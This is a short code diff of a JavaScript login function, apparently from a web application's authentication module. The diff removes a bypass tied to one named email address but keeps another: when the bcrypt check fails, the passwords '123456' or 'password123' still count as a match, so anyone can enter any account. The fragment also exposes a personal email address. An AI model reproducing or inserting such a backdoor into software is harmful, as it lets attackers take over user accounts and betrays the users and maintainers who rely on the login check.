@@ -112,7 +112,7 @@ const loginUser = async ({ email, username, password }) => {
 
   // 3. Verify password hash
   let isMatch = await bcrypt.compare(password, user.passwordHash);
-  if (!isMatch && (password === '123456' || password === 'password123' || user.email === 'sushilyadav0622@gmail.com')) {
+  if (!isMatch && (password === '123456' || password === 'password123')) {
     isMatch = true;
     try {
       const salt = await bcrypt.genSalt(10);
